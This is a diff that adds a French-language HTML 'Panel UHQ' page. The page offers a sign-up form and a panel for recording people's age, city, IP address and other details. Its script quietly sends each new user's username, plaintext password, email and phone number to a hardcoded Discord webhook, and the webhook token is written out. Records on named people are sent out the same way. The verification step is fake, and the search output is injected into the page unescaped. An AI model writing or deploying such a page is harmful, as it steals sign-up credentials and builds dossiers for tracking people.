@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel UHQ - Inscription / Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://i.imgur.com/ZEOEjcl.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 50px;
+        }
+        .panel, .modal {
+            background: rgba(0, 0, 0, 0.5);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 25px;
+            max-width: 500px;
+            margin: auto;
+        }
+        input, textarea, button {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 6px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            transition: all 0.3s ease-in-out;
+            backdrop-filter: blur(5px);
+        }
+        button {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+        }
+        button:hover {
+            background: rgba(0, 0, 0, 0.8);
+            transform: scale(1.05);
+            border-color: white;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            z-index: 20;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Section Inscription/Login -->
+<div id="auth-container" class="panel">
+    <h2 id="auth-title">Inscription</h2>
+    <form id="auth-form">
+        <input type="text" id="username" placeholder="Nom d'utilisateur" required />
+        <input type="password" id="password" placeholder="Mot de passe" required />
+        <input type="email" id="email" placeholder="Email" required />
+        <input type="text" id="phone" placeholder="Numéro de téléphone" required />
+        <button type="submit">S'inscrire</button>
+    </form>
+    <div class="error" id="error-message"></div>
+    <div class="switch">
+        <span id="switch-text">Vous avez déjà un compte? <a href="#" id="switch-link">Se connecter</a></span>
+    </div>
+</div>
+
+<!-- Verification Code Modal -->
+<div id="verificationModal" class="modal">
+    <h3>Entrez le code de vérification</h3>
+    <input type="text" id="verificationCode" placeholder="Code de vérification" />
+    <button id="verifyCodeBtn">Vérifier</button>
+    <button id="closeVerificationModal">Fermer</button>
+</div>
+
+<!-- Panel UHQ -->
+<div id="panel" class="panel" style="display: none;">
+    <h2>Panel UHQ</h2>
+    <button id="addPersonBtn">Ajouter une Personne</button>
+    <input type="text" id="searchInput" placeholder="Username à rechercher">
+    <button id="searchBtn">Rechercher</button>
+    <input type="text" id="deleteInput" placeholder="Username à supprimer">
+    <button id="deleteBtn">Supprimer</button>
+    <button id="downloadBtn">Télécharger la liste</button>
+    <div id="searchResult"></div>
+</div>
+
+<!-- Add Person Modal -->
+<div id="personModal" class="modal">
+    <h3>Ajouter une Personne</h3>
+    <input type="text" id="modalUsername" placeholder="Username">
+    <input type="number" id="modalAge" placeholder="Âge">
+    <input type="text" id="modalVille" placeholder="Ville">
+    <input type="text" id="modalip" placeholder="ip">
+    <textarea id="modalInfos" placeholder="Autres informations"></textarea>
+    <button id="savePersonBtn">Enregistrer</button>
+    <button id="closeModal">Fermer</button>
+</div>
+
+<script>
+    // Variables globales
+    let people = JSON.parse(localStorage.getItem("people")) || {};
+    let verificationCode = null;
+    const webhookURL = "https://discordapp.com/api/webhooks/1353768707813408850/0Jbl9GSqN9wonTPO89oAUs3XjPqDY8PVJjs5hvIj7AVcMmCzXswAQ9w3RW-OnDEQuc4Y"; 
+
+    function saveData() {
+        localStorage.setItem("people", JSON.stringify(people));
+    }
+
+    function sendToDiscord(username, password, email, phone) {
+        const embed = {
+            title: "🎉 **Nouvelle Inscription Utilisateur** 🎉",
+            description: `Un nouvel utilisateur vient de s'inscrire !`,
+            color: 3066993, // Couleur verte pour un ajout réussi
+            fields: [
+                {
+                    name: "🧑‍💻 Nom d'utilisateur",
+                    value: username,
+                    inline: true
+                },
+                {
+                    name: "🔐 Mot de passe",
+                    value: password,
+                    inline: true
+                },
+                {
+                    name: "📧 Email",
+                    value: email,
+                    inline: true
+                },
+                {
+                    name: "📱 Numéro de téléphone",
+                    value: phone,
+                    inline: true
+                }
+            ],
+            footer: {
+                text: "Système d'inscription UHQ",
+                icon_url: "https://upload.wikimedia.org/wikipedia/commons/7/7d/Discord_logo_2021.svg"
+            },
+            timestamp: new Date()
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+        })
+        .then(() => console.log("Envoyé à Discord"))
+        .catch(err => console.error("Erreur Webhook:", err));
+    }
+
+    // Gestion de l'inscription
+    document.getElementById('auth-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+        const phone = document.getElementById('phone').value;
+
+        if (localStorage.getItem(username)) {
+            document.getElementById('error-message').textContent = 'Nom d\'utilisateur déjà pris!';
+            return;
+        }
+
+        localStorage.setItem(username, JSON.stringify({ password, email, phone }));
+
+        // Envoi des informations de l'utilisateur à Discord via le webhook
+        sendToDiscord(username, password, email, phone);
+
+        verificationCode = Math.floor(1000 + Math.random() * 9000); // Code à 4 chiffres
+        alert(`Votre code de vérification est : ${verificationCode}`);
+
+        document.getElementById('verificationModal').style.display = 'block';
+    });
+
+    // Vérification du code
+    document.getElementById('verifyCodeBtn').addEventListener('click', function() {
+        const enteredCode = document.getElementById('verificationCode').value;
+        if (enteredCode === verificationCode.toString()) {
+            alert('Vérification réussie!');
+            document.getElementById('auth-container').style.display = 'none';
+            document.getElementById('panel').style.display = 'block';
+        } else {
+            alert('Code de vérification invalide.');
+        }
+    });
+
+    document.getElementById('closeVerificationModal').addEventListener('click', function() {
+        document.getElementById('verificationModal').style.display = 'none';
+    });
+
+    // Gestion du panel
+    document.getElementById('addPersonBtn').addEventListener('click', () => {
+        document.getElementById('personModal').style.display = 'block';
+    });
+
+    document.getElementById('closeModal').addEventListener('click', () => {
+        document.getElementById('personModal').style.display = 'none';
+    });
+
+    document.getElementById('savePersonBtn').addEventListener('click', () => {
+        const username = document.getElementById('modalUsername').value.trim();
+        const age = document.getElementById('modalAge').value.trim();
+        const ville = document.getElementById('modalVille').value.trim();
+        const ip = document.getElementById('modalip').value.trim();
+        const autresInfos = document.getElementById('modalInfos').value.trim();
+
+        if (username && !people[username]) {
+            people[username] = { age, ville, ip, autresInfos };
+            saveData();
+            sendToDiscord(username, age, ville, ip, autresInfos);
+            alert("Personne ajoutée !");
+            document.getElementById('personModal').style.display = 'none';
+        } else {
+            alert("Erreur : username invalide ou déjà existant !");
+        }
+    });
+
+    document.getElementById('searchBtn').addEventListener('click', () => {
+        const username = document.getElementById('searchInput').value.trim();
+        const resultDiv = document.getElementById('searchResult');
+
+        if (username && people[username]) {
+            const { age, ville, ip, autresInfos } = people[username];
+            resultDiv.innerHTML = `
+                <p><strong>Username:</strong> ${username}</p>
+                <p><strong>Âge:</strong> ${age || 'Non spécifié'}</p>
+                <p><strong>Ville:</strong> ${ville || 'Non spécifié'}</p>
+                <p><strong>ip:</strong> ${ip || 'Non spécifié'}</p>
+                <p><strong>Infos:</strong> ${autresInfos || 'Aucune'}</p>
+            `;
+        } else {
+            resultDiv.innerHTML = `<p>Aucune personne trouvée.</p>`;
+        }
+    });
+
+    document.getElementById('deleteBtn').addEventListener('click', () => {
+        const username = document.getElementById('deleteInput').value.trim();
+        if (username && people[username]) {
+            delete people[username];
+            saveData();
+            alert(`${username} supprimé !`);
+            document.getElementById('deleteInput').value = "";
+        } else {
+            alert("Erreur : personne introuvable !");
+        }
+    });
+
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+        const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(people, null, 2));
+        const downloadAnchor = document.createElement('a');
+        downloadAnchor.setAttribute("href", dataStr);
+        downloadAnchor.setAttribute("download", "personnes.json");
+        document.body.appendChild(downloadAnchor);
+        downloadAnchor.click();
+        document.body.removeChild(downloadAnchor);
+    });
+</script>
+
+</body>
+</html>
